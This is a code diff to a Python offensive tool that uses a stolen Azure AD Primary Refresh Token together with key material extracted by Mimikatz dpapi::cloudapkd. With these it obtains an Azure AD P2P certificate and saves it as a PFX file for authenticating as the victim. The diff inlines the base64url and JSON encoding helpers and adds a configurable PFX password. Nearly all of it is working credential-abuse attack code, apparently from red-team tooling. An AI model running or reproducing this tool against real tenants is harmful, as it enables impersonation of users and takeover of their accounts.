@@ -1,17 +1,30 @@
 # requirements
 # PyOpenSSL
-# python_jwt
 # requests
 
 import ast
 import base64
 import argparse
+import json
 
 import OpenSSL.crypto
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-from jwcrypto.common import base64url_encode, json_encode
+def base64url_encode(payload):
+    if not isinstance(payload, bytes):
+        payload = payload.encode('utf-8')
+    encode = base64.urlsafe_b64encode(payload)
+    return encode.decode('utf-8').rstrip('=')
+
+def json_encode(string):
+    if isinstance(string, bytes):
+        string = string.decode('utf-8')
+    return json.dumps(string, separators=(',', ':'), sort_keys=True)
+
+def CallFunctionWithNonNoneArgs(f, *args, **kwargs):
+    kwargsNotNone = {k: v for k, v in kwargs.items() if v is not None}
+    return f(*args, **kwargsNotNone)
 
 def GenerateCsr(common_name):
     key = OpenSSL.crypto.PKey()
@@ -45,7 +58,7 @@ def CertToPem(x5c):
 
 
 
-def GetAzureADP2PCert(TenantId, Prt, UserName, HexCtx, HexDerivedKey):
+def GetAzureADP2PCert(TenantId, Prt, UserName, HexCtx, HexDerivedKey, passPhrase="AzureADCert"):
     Ctx = bytes.fromhex(HexCtx)
     DerivedKey = bytes.fromhex(HexDerivedKey)
 
@@ -64,9 +77,6 @@ def GetAzureADP2PCert(TenantId, Prt, UserName, HexCtx, HexDerivedKey):
 
     # extract the nonce from the response
     nonce = ast.literal_eval(nonceRequest.text)['Nonce']
-
-    import python_jwt as jwt, jwcrypto.jwk as jwk, jwcrypto.jwe as jwe
-
 
     header = {
         'alg': 'HS256',
@@ -104,10 +114,10 @@ def GetAzureADP2PCert(TenantId, Prt, UserName, HexCtx, HexDerivedKey):
     pkcs.set_privatekey(OpenSSL.crypto.load_privatekey(OpenSSL.crypto.FILETYPE_PEM, PrivateKey))
     pkcs.set_certificate(OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, pemCert))
     with open(UserName + '.pfx', 'wb') as file:
-        file.write(pkcs.export(passphrase='mor'.encode()))
+        file.write(pkcs.export(passphrase=passPhrase.encode()))
 
     print("Done")
-    print("PFX saved with the name {0}.pfx".format(UserName))
+    print("PFX saved with the name {0}.pfx and password {1}".format(UserName, passPhrase))
 
 
 if __name__ == '__main__':
@@ -117,7 +127,7 @@ if __name__ == '__main__':
     parser.add_argument('--userName', help='Full name of Azure AD account (in the format USER@ORG).', required=True)
     parser.add_argument('--hexCtx', help='Contex hex from Mimikatz dpapi::cloudapkd.', required=True)
     parser.add_argument('--hexDerivedKey',  help='Derived Key hex from Mimikatz dpapi::cloudapkd.', required=True)
+    parser.add_argument('--passPhrase',  help='Optional password for the PFX file.')
 
     args = parser.parse_args()
-
-    GetAzureADP2PCert(args.tenantId, args.prt, args.userName, args.hexCtx, args.hexDerivedKey)
+    CallFunctionWithNonNoneArgs(GetAzureADP2PCert, args.tenantId, args.prt, args.userName, args.hexCtx, args.hexDerivedKey, passPhrase=args.passPhrase)
